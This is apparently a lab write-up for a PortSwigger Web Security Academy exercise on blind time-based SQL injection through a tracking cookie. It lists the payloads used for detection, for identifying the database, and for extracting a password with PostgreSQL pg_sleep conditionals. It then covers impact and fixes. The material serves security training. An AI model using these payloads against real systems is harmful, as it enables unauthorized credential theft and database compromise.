# Blind SQL Injection with Time Delays and Information Retrieval

## Platform
PortSwigger Web Security Academy

## Category
SQL Injection (Blind Time-Based SQLi)

## Lab Goal
- Extract administrator credentials
- Log in as administrator

---

# Vulnerability Description

The application was vulnerable to Blind SQL Injection through the tracking cookie parameter.

The application did not return visible SQL errors or differences in page content, making the injection "blind." However, the vulnerability could still be exploited using time-based payloads to infer database behavior.

---

# Initial Analysis

Testing the tracking cookie with common SQL injection payloads:

```sql
'
''
'--
' AND 1=1
' AND 1=2
```

All responses returned HTTP 200 OK without visible errors or content differences.

This indicated the possibility of Blind SQL Injection.

---

# Attempting Error-Based Detection

Payload:

```sql
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END)--
```

No visible database errors were returned.

This confirmed that the application suppressed SQL error messages.

---

# Time-Based SQL Injection Testing

## Testing Microsoft SQL Server Delay

Payload:

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

Result:
- No delay observed
- Microsoft SQL Server unlikely

---

## Testing PostgreSQL Delay

Payload:

```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

Result:
- Response delayed by approximately 10 seconds

Payload:

```sql
'; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

Result:
- Normal response time

This confirmed:
- Successful Blind SQL Injection
- Backend database was PostgreSQL

---

# Enumerating Database Information

## Checking if Administrator User Exists

Payload:

```sql
'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Result:
- 10-second delay observed

This confirmed that the username `administrator` existed in the database.

---

# Determining Password Length

Payload:

```sql
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Result:
- Delay observed

Payload:

```sql
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>100) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Result:
- No delay observed

Using Burp Suite Intruder, the administrator password length was determined to be:

```text
20 characters
```

---

# Extracting Password Characters

Payload:

```sql
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)>'a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Using Burp Suite Intruder, password characters were extracted one by one through timing analysis.

The extracted password was then used to successfully log in as the administrator.

---

# Impact

An attacker could exploit this vulnerability to:

- Extract sensitive data from the database
- Enumerate usernames and passwords
- Gain unauthorized administrator access
- Fully compromise application security

---

# Root Cause

The application directly inserted user-controlled cookie values into SQL queries without proper parameterization or sanitization.

Although database errors were hidden, the application remained vulnerable to time-based SQL injection due to observable response timing differences.

---

# Recommended Fixes

## 1. Use Parameterized Queries
Prepared statements should be used for all database interactions.

## 2. Validate User Input
Validate and sanitize all cookie values and user-controlled input.

## 3. Minimize Timing Side-Channels
Avoid application behavior that allows attackers to infer query execution paths based on response timing.

## 4. Principle of Least Privilege
Restrict database permissions to the minimum required level.

## 5. Security Monitoring
Monitor for suspicious payloads and repeated timing-based requests.

---

# Tools Used

- Burp Suite (Repeater, Intruder)
- Browser
- Ubuntu Linux

---

# Key Takeaways

- Blind SQL Injection can still lead to full database compromise even without visible errors.
- Time-based payloads allow attackers to infer database behavior through response delays.
- Understanding database-specific functions such as `pg_sleep()` is critical during exploitation.
- Burp Suite Intruder can automate timing-based enumeration attacks effectively.
